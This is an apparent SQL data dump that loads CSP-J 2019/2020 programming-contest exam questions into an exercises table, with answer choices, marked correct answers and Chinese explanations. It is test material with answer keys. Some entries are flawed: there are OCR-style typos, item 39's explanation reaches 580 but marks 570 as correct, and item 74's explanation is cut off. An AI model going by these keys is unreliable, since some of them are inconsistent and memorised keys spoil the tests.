INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (32, '<p>若m个x两两不同，且m个y都相等，则输出的值为()</p>', NULL, 26, '2n-2', '2n', '2m', '2n-2m', 'A', '解析：都不相同的话14行和16行不会执行，因此每次输入会有一组a,b赋值一共有m组;y都相同的话b[y]中会 保留最小的一个x,所以只存了一组值，空着2n-2', 0, 1, 0, 'test', '2023-11-04 20:46:31', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (33, NULL, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/2_20231104204733A004.png\"></p><p>概述：构造数列a的笛卡尔树（根节点最小且保持中序遍历），并求节点深度与b的加权和</p>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-11-04 20:48:03', '', NULL, '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (34, '<p>如果a数组有重复的数字，则程序运行时会发生错误。()</p>', NULL, 33, '', '', '', '', '错误', '解析：每次找a数组中第一次出现的最小值，所以有重 复的数不会导致程序出错', 1, 1, 0, 'test', '2023-11-04 20:48:53', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (35, '<p>如果b数担全为0,则输出为0()</p>', NULL, 33, '', '', '', '', '正确', '解析：因为递归最底层l>r返回0,而倒数第二层返回值是O+0+depth*b[mink],如果b是0的话也是0,以此类推，返回结果总是0', 1, 1, 0, 'test', '2023-11-04 20:49:16', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (36, '<p>当n=100时，最坏情况下，与第12行的比较运算执行的次数最接近的是（）</p>', NULL, 33, '5000', '600', '6', '100', 'A', '解析：最坏情况下a有序，mink每次都切在一段，递归 进行100层，执行次数为100+99+, +…1约等于5000', 0, 1, 0, 'test', '2023-11-04 20:49:58', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (37, '<p>当n=100时，最好情况下，与第12行的比较运算执行 的次数最接近的是（）</p>', NULL, 33, '100', '6', '5000', '600', 'D', '解析：最好情况下，每次都均分，每层递归总次数为 100,层数为logn约等于6,总次数月6*100=600', 0, 1, 0, 'test', '2023-11-04 20:50:41', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (38, '<p>当n=10时，若b组满足，对任意Osi&lt;n，都有b[i]=i +1,那么输出最大为（）</p>', NULL, 33, '386', '383', '384', '385', 'D', '解析:n=10时,深度最大能够达到10,最大输出为 1*b[0]+2*b[1]+...+10*b[9] =1*1+2*2+3*3+4*4+5*5+6*6+7*7+8*8+9*9+10*10=385', 0, 1, 0, 'test', '2023-11-04 20:51:27', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (39, '<p>)当n=100时，若b数组满足，对任意0&lt;=i&lt;n，都 有b[i]=1,那么输出最小为（）</p>', NULL, 33, '582', '570', '589', '581', 'B', '解析：b=1,即求一个100节点的二叉树，节点深度之 和最小，贪心法，结论是100节点的完全二叉树。 1*1+2*2+4*3+8*4+16*5+32*6+37*7=580', 0, 1, 0, 'test', '2023-11-04 20:52:17', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (40, NULL, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/3_20231104205422A005.png\"></p><p>提示：</p><p>“≪”表示二进制左运算符，例如 11 2 ≪ 2 = 1100 2 而“^”表示二进制异或运算符，它将两个参与运算的每个对应的二进制位一一进行比较，若两个二进制位相同，则运算结果的对应二进制位为0,反之为1.</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/4_20231104205553A006.png\"></p><p><br></p>', -1, '', '', '', '', '', NULL, -1, 2, 0, 'test', '2023-11-04 20:56:33', '', NULL, '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (41, '<p>①处应填（）</p>', NULL, 40, 'n%2', '0', 't', '1', 'C', '解析：递归边界，res只有这一处赋值，BD显然错。 n%2的话01只跟n有关，错，因此只有t是对的', 0, 2, 0, 'test', '2023-11-04 20:57:41', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (42, '<p>②处应填（）</p>', NULL, 40, 'x - step，y', 'x，y-step', 'x-step.y', 'x,y-step', 'D', '解析：step是边长的一半，借鉴15, 16行，参数x,y是 当前左上角坐标。14-17分别是左上，左下，右上，右 下四个子矩阵', 0, 2, 0, 'test', '2023-11-04 20:58:52', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (43, '<p>③处应填（）</p>', NULL, 40, 'x-step, y-step', 'x+step,y+step', 'x-step, y', 'x, y-step', 'B', '同上', 0, 2, 0, 'test', '2023-11-04 21:00:01', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (44, '<p>④处应填（）</p>', NULL, 40, 'n-1, n % 2', 'n,0', 'n,n%2', 'n-1,0', 'B', '解析：此处是递归计算的入口，即题目最终所求的大小为2^n * 2^n，由单个数字 0 变化来的矩阵，因此递归函数的另俩个参数为 n, 0', 0, 2, 0, 'test', '2023-11-04 21:01:22', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (45, '<p>⑤处应填()</p>', NULL, 40, '1<<(n+1)', '1<<n', 'n+1', '1<<(n-1)', 'B', '解析：size是输出矩阵的边长，也就是2^n,用位运算 写就是1<<n', 0, 2, 0, 'test', '2023-11-04 21:02:17', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (46, NULL, '<p>(计数排序）计数棑序是一个广泛使用的排序方法.下而的程序使用双关键字计数排序，将</p><p>n 对 10000 以内的整数，从小到大排序。</p><p>例如有三对整数（3,4)、（2,4)、（3,3),那么排序之后应该是(2,4)、(3,3)、(3,4). 输入第一行为 n,接下来 n 行，第 i 行有两个数 a[i]和 b[i],分別表示第 i 对整数的第一关键字</p><p>和第二关键字。从小到大排序后输出。</p><p>数据范围：1 ≤ n ≤ 10</p><p>7</p><p>, 1 ≤ a I , b i ≤ 10</p><p>4</p><p>提示：应先对第二关键字排序，冉对第一关键字排序.数组 ord[]存储第二关键字排序的结果，</p><p>数组 rest[]存储双关键字样序的结果，</p><p>试补全程序。</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/5_20231104210328A007.png\"></p>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-11-04 21:03:36', '', NULL, '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (47, '<p>①处应填（）</p>', NULL, 46, '++cnt[i]', '++cnt[b[i]]', '++cnt[a[i] * maxs + b[i]]', '++cnt[a[i]]', 'B', '解析：此处是对第二关键字进行计数排序。题目中给出提示，先按第二关键字排序。并且根据填空 2 对 ord 进行更改， 可知此时是対第二关键字进行排序。', 0, 1, 0, 'test', '2023-11-04 21:05:32', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (48, '<p>②处应填（）</p>', NULL, 46, 'ord[--cnt[a[i]]]=i', 'ord[--cnt[b[i]]]=a[i]', 'ord[--cnt[a[i]]]=b[i]', 'ord[--cnt[b[i]]]=i', 'D', '解析：cnt[b[i]]表示按第二关键字，第 i 个数排第几位。ord[i]表示第 i 小的数在原序列的位置', 0, 1, 0, 'test', '2023-11-04 21:06:35', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (49, '<p>③处应填（）</p>', NULL, 46, '++cnt[b[i]]', '++cnt[a[i] * maxs + b[i]]', '++cnt[a[i]]', '++cnt[i]', 'C', '解析：对第一关键字计数，并做各关键词的数量统计工作，因此将 a[i]对应的元素数量自增一。', 0, 1, 0, 'test', '2023-11-04 21:08:17', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (50, '<p>)④处应填（）</p>', NULL, 46, 'res[-cnt[a[ord[i]]]]=ord[i]', 'res[-cnt[b[ord[i]]]]=ord[i]', 'res[-cnt[b[i]]]=ord[i]', 'res[-cnt[a[i]]]=ord[i]', 'A', '解析：对应填空 2 ord[i]记录了第二关键字第 i 小 的数在原序列的位置。此时 res[i]记录了第一关键字第 i 小的数在原序列的位置。', 0, 1, 0, 'test', '2023-11-04 21:09:24', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (51, '<p>⑤处应填（）</p>', NULL, 46, 'a[i],b[i]', 'a[res[i]],b[res[i]]', 'a[ord[res[i]]],b[ord[res[i]]]', 'a[res[ord[i]]],b[res[ord[i]]]', 'B', '解析：此处是按顺序输出排序结果，由于之前已经按照第二、第一关键字进行计数排序，所以此时第 i 个元素的原始下标为 res[i].', 0, 1, 0, 'test', '2023-11-04 21:10:25', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (52, '<p>在内存储器中每个存储单元都被赋予一个唯一的序号，称为（）。</p>', NULL, -1, '下标', '地址', '序号', '编号', 'B', '解析：考察计算机存储，内存里面唯一的序号是地址。', 0, 0, 0, 'test', '2023-11-04 21:11:44', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (53, '<p>编译器的主要功能是（）o</p>', NULL, -1, '将源程序翻译成机器指令代码', '将一种高级语言翻译成另一种高级语言', '将源程序重新组合', '将低级语言翻译成高级语言', 'A', '解析：考察编译器的原理，编译器主要的功能是将源程序翻译成机器指令，这是一个从高级语言到低级语言的过程，所以 C, D 都是错的，B 显然错误。', 0, 0, 0, 'test', '2023-11-04 21:12:58', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (54, '<p>设 x=true,y=true,z=false,以下逻辑运算表达式值为真的是（）。</p>', NULL, -1, '(x∧y)∧z', 'x∧(z∨y)∧z', '(x∧y)∨(z∨x)', '(y∨z)∧x∧z', 'C', '解析：考察逻辑运算。A, B, D 选项中均和 z 相与，而 z 是 false，所以可以排除，答案为 C', 0, 0, 0, 'test', '2023-11-04 21:13:54', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (55, '<p>现有一张分辨率为 2048x1024 像素的 32 位真彩色图像。请问要存储这张图像，需要多大的存储空间？（）。</p>', NULL, -1, '4MB', '8MB', '32MB', '16MB', 'B', ' 解析：考察存储单元的转化。1B = 8bit，32 位真彩色图像的一个像素为 4B，所以 2048*1024*4 B = 8MB。', 0, 0, 0, 'test', '2023-11-04 21:14:58', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (56, '<p> 冒泡排序算法的伪代码如下：</p><p>输入：数组 L,n≥l。输出：按非递减顺序排序的 。</p><p>算法 BubbleSort：</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/6_20231104211548A008.png\"></p><p>对 n 个数用以上冒泡排序算法进行排序，最少需要比较多少次? </p>', NULL, -1, 'n', 'n-2', 'n*n', 'n-1', 'D', ' 解析：考察冒泡排序的时间复杂度。题目要求的是最少时间，我们可以发现，当数组本身是有序的时候，flag 的值会一直是 1，不会改变，所以 j 是从 1 到 n-1，一共比较了n-1 次，所以选 D。', 0, 0, 0, 'test', '2023-11-04 21:17:20', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (57, '<p>设 A 是 n 个实数的数组，考虑下面的递归算法: </p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/7_20231104211804A009.png\"></p><p>请问算法 XYZ 的输出是什么？（ ）o</p>', NULL, -1, 'A 数组的平均值', 'A 数组的最小值', 'A 数组的最大值', 'A 数组的中值', 'B', '考察递归程序的理解。从代码的第三行到第五行，我们可以发现，返回值是 temp 和 A[i]中较小的值，所以代码输出的为 A 数组的最小值。', 0, 0, 0, 'test', '2023-11-04 21:19:41', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (58, '<p>链表不具有的特点是（）o</p>', NULL, -1, '插入删除不需要移动元素', '可随机访问任一元素', '不必事先估计存储空间', '所需空间与线性表长度成正比', 'B', ' 解析：考察链表。链表是一种线性结构，由 val 和 next 指针构成，它的特点就\n是不用预先估算空间，插入和删除只需要将 next 指针重新赋值，因为它是线性结构，所以所需空间与线性表长度成正比。因为链表没有下标，同时地址也是不连续的，所以我们无法随机访问其中的元素。', 0, 0, 0, 'test', '2023-11-04 21:20:45', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (59, '<p>有 10 个顶点的无向图至少应该有（）条边才能确保是一个连通图。</p>', NULL, -1, '10', '12', '9', '11', 'C', '解析：考察无向图连通图性质。n 个顶点的无向连通图至少要有 n-1 条边', 0, 0, 0, 'test', '2023-11-04 21:21:22', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (60, '<p>二进制数 1011 转换成十进制是？</p>', NULL, -1, '10', '13', '11', '12', 'C', '考察进制转化。通过位权扩展得：1011(2) => 1*2^3 + 0*2^2 + 1*2^1 +1*2^0=11', 0, 0, 0, 'test', '2023-11-04 21:22:05', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (61, '<p>五个小朋友并排站成一列，其中有两个小朋友是双胞胎, 如果要求这两个双胞胎必须相邻，则有（）种不同排列方法？</p>', NULL, -1, '24', '36', '72', '48', 'D', ' 解析：考察排列组合。根据捆绑法，将两个双胞胎看成一个人，所以有 A(4, 4)种可能，然后双胞胎自己也有顺序，为 A(2,2)，根据分步原理：A(4,4)*A(2,2) = 48。', 0, 0, 0, 'test', '2023-11-04 21:22:46', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (62, '<p>下图中所使用的数据结构是()</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/8_20231104212332A010.png\"></p>', NULL, -1, '哈希表', '二叉树', '栈', '队列', 'C', '考察数据结构。从图发现是典型的“先进后出”结构，所以符合性质的是栈', 0, 0, 0, 'test', '2023-11-04 21:24:17', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (63, '<p>独根树的高度为 1。具有 61 个结点的完全二叉树的高度为()</p>', NULL, -1, '7', '5', '8', '6', 'D', ' 解析：考察二叉树性质。由题意可知，根节点为第一层，那么结点数为 61 个的完全二叉树层数为 2^0 + 2^1 + 2^2 + 2^3 + 2^4 + 2^5 > 61，所以高度为 6。', 0, 0, 0, 'test', '2023-11-04 21:25:07', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (64, '<p>干支纪年法是中国传统的纪年方法，由 10 个天干和 12 个地支组合成 60 个</p><p>天干地支。由公历年份可以根据以下公式和表格换算出对应的天干地支。</p><p>天干=（公历年份）除以 10 所得余数</p><ol><li>地支=（公历年份）除以 12 所得余数</li></ol><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/9_20231104212612A011.png\"></p><p><br></p><p>例如，今年是 2020 年，2020 除以 10 余数为 0,查表为\"庚”；2020 除以 12, 余数为 4,査表为“子力，所以今年是庚子年。</p><p>请问 1949 年的天干地支是（）</p>', NULL, -1, '己亥', '己丑', '己卯', '己酉', 'B', '解析：由 1949%10=9 以及 1949%12=5，所以答案为 B', 0, 0, 0, 'test', '2023-11-04 21:27:38', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (65, '<p>有五副不同颜色的手套（共 10 只手套，每副手套左右手各 1 只），一次性 从中取 6 只手套，请问恰好能配成两副手套的不同取法有（）种。</p>', NULL, -1, '30', '150', '180', '120', 'D', ' 解析：考察排列组合。按照分步原理，我们先选择 2 双颜色相同的手套，则有C(2,5) 种 可 能 ， 再 从 剩 下 的 3 种 颜 色 里 面 取 两 种 颜 色 的 手 套 出 来 ， 各 一 只 ， 共 有C(2,3)*C(1,2)*C(1,2)种可能，所以最后的答案是 C(2,5)*C(2,3)*C(1,2)*C(1,2) = 120。', 0, 0, 0, 'test', '2023-11-04 21:28:55', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (66, NULL, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/10_20231104213008A012.png\"></p>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-11-04 21:31:09', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (67, '<p>输入的字符串应当只由大写字母组成，否则在访问数组时可能越界。()</p>', NULL, 66, '', '', '', '', '正确', '因为数组只有 26 个，代码第 30 行，st[i]-’A’作为下标，如果 st[i]不是大写字母，则有可能越界', 1, 1, 0, 'test', '2023-11-04 21:31:53', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (68, '<p>若输入的字符串不是空串，则输入的字符串与输出的字符串一定不一样。()</p>', NULL, 66, '', '', '', '', '错误', '从上面 decoder 字符数组可以看出从 T-Z 字符跟字母表的顺序是一致的。', 1, 1, 0, 'test', '2023-11-04 21:32:15', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (69, '<p>将第 12 行的“i &lt; 26”改为“i &lt; 16”,程序运行结果不会改变。()</p>', NULL, 66, '', '', '', '', '正确', '因为 encoder 是全局变量，后面均为 0。', 1, 1, 0, 'test', '2023-11-04 21:32:46', 'test', '2023-11-04 21:32:55', NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (70, '<p> 将第 26 行的“i &lt; 26”改为“i &lt; 16”，程序运行结果不会改变。()</p>', NULL, 66, '', '', '', '', '错误', '如果改为 i<16，则 decoder 字符数组内容将改变，输出结果也会改变。', 1, 1, 0, 'test', '2023-11-04 21:33:19', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (71, '<p>若输岀的字符串为“ABCABCABCA”，则下列说法正确的是()</p>', NULL, 66, '输入的字符串中既有 A 又有 P', '输入的字符串中既有 S 又有 B', '输入的字符串中既有 S 又有 P', '输入的字符串中既有 A 又有 B', 'C', 'decoder 的值为输出结果，输出 ABC 对应的输入刚好是 CSP', 0, 1, 0, 'test', '2023-11-04 21:34:24', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (72, '<p>若输出的字符申为“CSPCSPCSPCSP”，则下列说法正确的是()。</p>', NULL, 66, '输入的字符串中既有 J 又有R', '输入的字符串中既有 P 又有 K', '输入的字符串中既有 J 又有 K', '输入的字符串中既有 P 又有 R', 'D', 'Decoder 的值为输出结果，输出 CSP 对应的输入刚好是 PRN，所以选 D', 0, 1, 0, 'test', '2023-11-04 21:35:28', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (73, NULL, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/11_20231104213705A013.png\"></p><p>假设输入的 n 是不超过 2的62次方 的正整数,k 都是不超过 10000 的正整数，完 成下面的判断题和单选题：</p>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-11-04 21:37:51', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (74, '<p>若 k=1,则输出 ans时,len=n</p>', NULL, 73, '', '', '', '', '错误', '当 k=1 时，len 只会被加一次，所以 len 的值为 2，ans 的值', 1, 1, 0, 'test', '2023-11-04 21:38:50', '', NULL, NULL);
